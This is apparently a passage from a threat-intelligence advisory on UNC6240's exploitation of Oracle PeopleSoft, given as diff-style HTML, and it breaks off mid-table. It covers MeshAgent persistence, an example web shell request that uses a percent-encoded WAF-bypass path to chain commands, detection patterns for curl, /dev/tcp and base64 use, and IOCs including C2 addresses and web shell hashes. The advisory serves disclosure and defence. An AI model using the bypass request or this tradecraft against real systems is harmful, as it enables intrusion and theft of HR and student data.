+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;To establish persistent access after web shell placement on Linux systems, UNC6240 deployed the legitimate RMM tool MeshAgent. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;In earlier May and July 2026 intrusions, the actor dropped unencrypted agent binaries and configuration files directly into &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/tmp&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;meshagent&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;meshagent.msh&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, and &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;meshagent.db&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) under the PeopleSoft service account, routing outbound connections to Microsoft-masquerading domains including &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;azurenetfiles.net&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;microsoft-entra.net&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, and &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;enroll.azuredevice.cloud&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;In September 2026 intrusions, UNC6240 continued to use IT-themed infrastructure associated with MeshAgent (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;winmanage-me.network&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; on &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;104.219.234.138&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) for secondary staging and management.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;MeshCentral is a legitimate open-source remote management platform that threat actors, including UNC6240, use to maintain interactive access to victim systems over web sockets.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;Observed Post-Exploitation Commands&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Across compromised instances, a quarter of the threat actor's commands executed as &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;root&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; or &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;NT Authority\SYSTEM&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, granting full control of the operating system. The remaining commands were executed under PeopleSoft or WebLogic service accounts, which still provide access to PeopleSoft configuration files, database connection strings, and application data. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Command activity through the web shells fell into several categories:&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Host and user discovery, including &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;hostname&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; and &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;whoami&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Process verification, polling process listings with &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;tasklist&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; to verify payload execution.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;An example web shell request using the encoded path follows:&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;pre class="language-markup"&gt;&lt;code&gt;GET /%50SEMHUB/&amp;lt;webshell&amp;gt;.jsp?c=id;hostname;uname+-a HTTP/1.1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 6: Example web shell request&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Remediation and Hardening&lt;/span&gt;&lt;/h3&gt;
+&lt;h4&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;Patch and Reduce Exposure&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Apply the Oracle Security Alert for CVE-2026-35273 and remain on supported PeopleTools versions. Disable the EMHub service if it is not used for patching or remove the PSEMHUB application. EMHub and the Integration Broker listening connector are administrative and system-to-system components, and restricting them from public internet access is non-breaking for standard PeopleSoft Internet Architecture (PIA) user sessions.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;Log and Endpoint Monitoring&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Search PIA WebLogic access logs for requests to &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/PSEMHUB/&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; and encoded variants, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;POST&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; requests to &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/hub&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; with bodies from external sources, and requests to unexpected &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;.jsp&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; or &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;.jspx&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; files under PSEMHUB or PORTAL. On hosts, alert on shell processes (&lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;cmd.exe&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/bin/sh&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;bash&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;) spawned by the WebLogic Java process, particularly those invoking &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;base64 -d&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;curl&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/dev/tcp&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;tasklist&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, or &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;start /b&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;Host-Level Auditing&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Scan &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;PSEMHUB.war/&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; and &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;PORTAL.war/&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; for unexpected &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;.jsp&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;.jspx&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;, and &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;.exe&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; files, inspect &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;.../PSEMHUB.war/envmetadata/transactions/&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; for unauthorized content, and check for unexpected MeshCentral agents. Organizations that identify a web shell should treat the host as compromised, preserve evidence, and rotate all credentials accessible from the PeopleSoft tier, prioritizing hosts where the WebLogic service runs as &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;root&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; or &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;SYSTEM&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt;.&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;Hunt for Evidence of Data Theft &lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Review PeopleSoft and database hosts for large archive files (.tar, .tar.gz, .zst) in temporary or web-accessible directories, and for tar, zstd, rsync, sshpass, or curl processes spawned by the PeopleSoft or WebLogic service accounts. Review database audit logs for bulk queries or exports against HR, payroll, and student records tables, and network logs for large or sustained outbound transfers from the PeopleSoft tier, including rsync (TCP 873), SSH, and HTTP POST traffic to the network indicators listed in this post. &lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;Prepare for Extortion&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;UNC6240 has a well-established pattern of data theft extortion, that is, stealing data and threatening to release it on a data leak site unless the victim pays a ransom. Affected organizations should prepare for extortion communications and monitor for potential public exposure of stolen data.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Indicators of Compromise (IOCs)&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;To assist the wider community in hunting and identifying activity outlined in this blog post, we have included IOCs in a &lt;/span&gt;&lt;a href="https://www.virustotal.com/gui/collection/23dd0be8f55d6ab7e425806a1a02847a8898bdfe0b7e9c1745e558240147532b/summary" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;GTI collection for registered users&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Network Indicators&lt;/span&gt;&lt;/h4&gt;
+&lt;div align="left"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;&lt;table&gt;&lt;colgroup&gt;&lt;col /&gt;&lt;col /&gt;&lt;col /&gt;&lt;/colgroup&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th scope="col" style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Indicator&lt;/strong&gt;&lt;/p&gt;
+&lt;/th&gt;
+&lt;th scope="col" style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Type&lt;/strong&gt;&lt;/p&gt;
+&lt;/th&gt;
+&lt;th scope="col" style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Description&lt;/strong&gt;&lt;/p&gt;
+&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;5.199.162.157&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;IPv4&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Attack controller, scanner, and HTTP callback receiver&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;104.219.234.138&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;IPv4&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Exfiltration staging and remote management host&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;162.219.30.165&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;IPv4&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;C2 for SIDEEYE backdoor&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;winmanage-me.network&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Domain&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Resolves to staging host; MeshCentral infrastructure&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="vertical-align: baseline; color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;Table 1: Network indicators&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;Host Indicators&lt;/span&gt;&lt;/h4&gt;
+&lt;pre class="language-markup"&gt;&lt;code&gt;&amp;lt;PS_CFG_HOME&amp;gt;/webserv/&amp;lt;domain&amp;gt;/applications/peoplesoft/PSEMHUB.war/x.jsp
+&amp;lt;PS_CFG_HOME&amp;gt;/webserv/&amp;lt;domain&amp;gt;/applications/peoplesoft/PSEMHUB.war/u.jsp
+&amp;lt;PS_CFG_HOME&amp;gt;/webserv/&amp;lt;domain&amp;gt;/applications/peoplesoft/PSEMHUB.war/Ple64.exe
+&amp;lt;PS_CFG_HOME&amp;gt;/webserv/&amp;lt;domain&amp;gt;/applications/peoplesoft/PSEMHUB.war/tunnel.jsp
+&amp;lt;PS_CFG_HOME&amp;gt;/webserv/&amp;lt;domain&amp;gt;/applications/peoplesoft/PSEMHUB.war/tunnel.jspx
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;&lt;span style="vertical-align: baseline;"&gt;Figure 7: Host indicators&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;URI pattern: &lt;/span&gt;&lt;code style="vertical-align: baseline;"&gt;/%50SEMHUB/&lt;/code&gt;&lt;span style="vertical-align: baseline;"&gt; (percent-encoded WAF bypass path; defenders should assume that threat actors may use any percent-encoded, mixed-case, or otherwise non-normalized variant of /PSEMHUB/ and enforce blocking on the normalized path).&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;span style="vertical-align: baseline;"&gt;File Indicators&lt;/span&gt;&lt;/h4&gt;
+&lt;div align="left"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;&lt;table&gt;&lt;colgroup&gt;&lt;col /&gt;&lt;col /&gt;&lt;col /&gt;&lt;/colgroup&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th scope="col" style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;File Name&lt;/strong&gt;&lt;/p&gt;
+&lt;/th&gt;
+&lt;th scope="col" style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;SHA-256&lt;/strong&gt;&lt;/p&gt;
+&lt;/th&gt;
+&lt;th scope="col" style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Description&lt;/strong&gt;&lt;/p&gt;
+&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;x.jsp&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;48b4a0827da7bbfce9fb52464f8a659dea7a035189c52c506c0bfb4b1c3fe494&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Primary execution web shell; hashes will vary due to extra newline characters.&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;u.jsp&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;2bee941fb40519d0d1ec52bd79a8f63fc65aac6455c8f2d6b668e3360dfdb5d7&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Execution stager servlet&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;tunnel.jsp&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;419c571ee38b7e7266d130c4b6bbc4dd0ef44d6e5f3bc02cc2cf73b762f07c86&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Neo-reGeorg JSP tunnel (open-source). Hashes will vary by key used.&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;tunnel.jspx&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;ba14419beb2ec0bb94cab6298c14d7fb3e1d819366fe378290c0c2a4d97f7e07&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Neo-reGeorg JSPX tunnel (open-source). Hashes will vary by key used.&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;Ple64.exe&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;code style="vertical-align: baseline;"&gt;3ba215692665513abfffd4e815c5c45f2d41e5dcc4283a2a3b740930c5c417c3&lt;/code&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Trojanized installer delivering SIDEEYE backdoor&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p style="text-align: center;"&gt;&lt;span style="vertical-align: baseline; color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;"&gt;Table 2: File indicators&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;Google Security Operations&lt;/span&gt;&lt;strong style="vertical-align: baseline;"&gt; &lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Google Security Operations customers will have access to the following rules. These rules will be available under the Mandiant Frontline Threats rule pack:&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Oracle PeopleSoft Configuration Inspection&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Sshpass Interactive File Deployment&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Data Archiving or Compression via Zstd Utility&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;MeshCentral Command Execution via Meshctrl&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Pending deployment in the Mandiant Frontline Threats rule pack:&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Oracle PeopleSoft Suspicious File Write to Web Application Archive Directory&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;MITRE ATT&amp;amp;CK Mapping&lt;/span&gt;&lt;/h3&gt;
+&lt;div align="left"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;
+&lt;div style="color: #5f6368; width: 100%;"&gt;&lt;table&gt;&lt;colgroup&gt;&lt;col /&gt;&lt;col /&gt;&lt;/colgroup&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th scope="col" style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Tactic&lt;/strong&gt;&lt;/p&gt;
+&lt;/th&gt;
+&lt;th scope="col" style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Technique&lt;/strong&gt;&lt;/p&gt;
+&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Reconnaissance&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1596.003 Search Open Technical Databases: Digital Certificates&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Reconnaissance&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1596.005 Search Open Technical Databases: Scan Databases&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Reconnaissance&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1595.002 Active Scanning: Vulnerability Scanning&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Initial Access&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1190 Exploit Public-Facing Application&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Defense Evasion&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1027 Obfuscated Files or Information&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Execution&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1059.003 Command and Scripting Interpreter: Windows Command Shell&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Execution&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;T1059.004 Command and Scripting Interpreter: Unix Shell&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Persistence&lt;/span&gt;&lt;/p&gt;
+&lt;/td&gt;
+&lt;td style="vertical-align: top; border: 1px solid #000000; padding: 16px;"&gt;
